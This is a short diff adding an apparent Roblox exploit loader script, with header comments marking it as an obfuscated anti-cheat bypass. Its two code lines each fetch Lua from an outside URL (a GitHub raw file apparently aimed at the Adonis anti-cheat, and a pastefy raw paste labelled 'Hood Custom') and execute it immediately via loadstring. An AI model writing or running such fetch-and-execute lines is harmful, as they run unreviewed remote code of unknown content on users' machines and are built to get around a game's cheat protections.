@@ -1,0 +1,6 @@
+-- Bypass: Yes
+-- Obfuscated: Yes
+-- Development Speed: Slow
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Pixeluted/adoniscries/refs/heads/main/Source.lua"))() -- bypasses
+loadstring(game:HttpGet("https://pastefy.app/3etKLt0E/raw", true))() -- Hood Custom
